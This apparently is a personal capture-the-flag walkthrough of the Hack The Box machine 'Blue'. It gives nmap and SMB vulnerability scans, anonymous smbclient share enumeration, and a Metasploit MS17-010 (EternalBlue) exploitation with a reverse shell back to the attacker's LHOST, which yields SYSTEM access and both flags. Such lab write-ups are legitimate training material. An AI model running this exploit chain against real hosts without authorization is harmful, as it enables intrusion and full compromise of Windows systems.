<img src="Pasted image 20240722181922.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
```
ping 10.10.10.40
```
![[Pasted image 20240613133354.png]]

**Nmap default Scan**
```
nmap 10.10.10.40 -oN dnmap
```
![[Pasted image 20240613173709.png]]

**Script and Service Scan**
```
nmap 10.10.10.40 -sC -sV -oN snmap
```
![[Pasted image 20240613174647.png]]
![[Pasted image 20240613174727.png]]

All port Scan
```
nmap 10.10.10.40 -sC -sV -p- -T5 --open -oN anmap
```
No new Ports  found, same as script and Service scan

Smb Script Scan
```
nmap --script smb-vuln* --script smb-enum-users.nse 10.10.10.40
```
![[Pasted image 20240613184643.png]]
It is Vulnerable as Expected.

Smb Enumeration
```
smbclient -U '' -L \\\\10.10.10.40\\
```
![[Pasted image 20240613174105.png]]
We got some  interesting share, lets enumerate.

```
smbclient -N //10.10.10.40/share
```
![[Pasted image 20240613174159.png]]
no useful files in **'share',** will try with **'users'**

```
smbclient -N //10.10.10.40/users
```
![[Pasted image 20240613174332.png]]
This looks interesting, lets  enumerate further.

All the files from the below screenshots are got from the smb share **Users**
![[Pasted image 20240613183814.png]]

Can't find any useful Information after analysing the files I got from the SMB Shares.

Will jump back to the Vulnerability we found for SMB.


Will use Metasploit
![[Pasted image 20240613185004.png]]

Will Search for exploits
```
search ms17-010
use 2
```
![[Pasted image 20240613185115.png]]
![[Pasted image 20240613185208.png]]

Will  set LHOST, RHOST
```
set LHOST 10.10.14.61
set RHOST 10.10.10.40
exploit
```
![[Pasted image 20240613185359.png]]

We got Shell
```
shell
```
```
whoami
```
![[Pasted image 20240613185441.png]]
We landed as a nt/authority, so no need Privilege escalation.

Got user.txt in user haris Desktop
```
type user.txt
ipconfig
```
![[Pasted image 20240613185815.png]]

Got Root flag in Administrator Desktop
```
type root.txt
ipconfig
```
![[Pasted image 20240613185959.png]]


We are done with BLUEEEEEEEE.....:)